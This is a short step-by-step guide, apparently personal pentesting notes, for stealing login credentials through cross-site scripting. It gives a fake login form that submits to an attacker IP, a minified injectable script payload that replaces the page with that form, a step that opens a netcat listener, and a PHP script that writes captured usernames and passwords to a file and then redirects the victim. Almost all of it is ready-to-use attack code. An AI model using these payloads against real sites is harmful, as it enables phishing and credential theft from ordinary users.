1) Create the following form:
```HTML
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

2) Then mimify that HTML form and add it to document.write(HTMLmimified), then insert this in the XSS:
```JS
`document.write('<h3>Please login to continue</h3><form action=http://Attack_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();`
```

3) Send a payload of a contact form using:
```js
'><script>document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById("urlform").remove();</script><!--

```

4) Grab final URL after inputing this XSS into the field and it loads, then open up a nc listener and wait for user

5) write a php script to capture creds and then revert user back to the main page pre xss. Save this as index.php in the /tmp/server. Follow these steps:
```CLI
mkdir /tmp/tmpserver

cd /tmp/tmpserver

vi index.php   #Ender code below

<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
```CLI
sudo php -S 0.0.0.0:80
```

